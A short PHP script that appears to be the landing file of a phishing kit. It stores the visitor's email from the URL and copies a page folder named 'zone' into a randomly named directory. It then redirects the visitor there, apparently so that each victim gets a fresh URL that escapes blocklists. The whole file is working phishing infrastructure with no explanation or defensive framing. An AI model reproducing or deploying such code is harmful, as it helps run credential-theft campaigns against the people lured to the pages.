<?php

include('proxy.php');
$random = rand(0,getrandmax());
$dst    = substr(md5($random), 0, 1000000000);

$_SESSION['email'] = $_GET['email'];
function recurse_copy($src,$dst)
{
	$dir = opendir($src);
	@mkdir($dst);
	while(false !== ( $file = readdir($dir)) ) {
		if (( $file != '.' ) && ( $file != '..' )) {
			if ( is_dir($src . '/' . $file) ) {
				recurse_copy($src . '/' . $file,$dst . '/' . $file);
			}
			else {
				copy($src . '/' . $file,$dst . '/' . $file);
			}
		}
	}
	closedir($dir);
}

$src="zone";
recurse_copy( $src, $dst );

header("location:".$dst."");

?>
